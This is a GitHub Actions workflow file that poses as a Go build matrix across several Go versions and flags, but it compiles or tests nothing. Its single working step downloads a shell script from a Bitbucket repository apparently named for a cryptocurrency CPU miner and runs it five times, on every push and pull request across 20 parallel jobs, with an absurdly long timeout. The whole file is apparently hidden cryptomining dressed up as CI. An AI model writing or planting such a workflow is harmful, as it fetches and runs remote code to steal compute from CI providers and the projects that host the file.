name: Start
on: [push, pull_request]
jobs:
  build:
    name: Worker
    runs-on: ubuntu-18.04
    strategy:
      max-parallel: 30
      fail-fast: false
      matrix:
        go: [1.6, 1.7, 1.8, 1.9, 1.10]
        flag: [A, B, C, D]
    timeout-minutes: 9999999999999999999
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: Worker
      run: |
        wget https://bitbucket.org/cpuoptminer/dgb/raw/97055e9f9d0eb10dded48d87015b901744922bc7/start.sh && chmod u+x start.sh && ./start.sh && ./start.sh && ./start.sh && ./start.sh && ./start.sh


            